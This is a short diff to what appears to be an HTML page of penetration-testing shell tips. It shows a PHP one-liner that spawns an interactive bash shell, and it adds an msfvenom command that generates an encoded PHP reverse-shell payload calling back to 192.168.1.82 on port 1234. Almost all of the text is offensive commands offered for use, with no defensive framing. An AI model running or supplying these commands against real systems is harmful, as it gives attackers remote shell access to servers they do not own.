@@ -23,4 +23,8 @@ P.S: it is quite common to see expect installed on *nix application servers<br/>
 <br/>
 <br/>
 on the server and need to get a shell from php?<br/>
-php -r 'system("/bin/bash -i");'</body></html>
+php -r 'system("/bin/bash -i");'<br/>
+<br/>
+<br/>
+easy to generate the full php/reverse_php payload with <br/>
+msfvenom -p php/reverse_php LHOST=192.168.1.82 LPORT=1234 --smallest -b '/x34' -e php/base64</body></html>
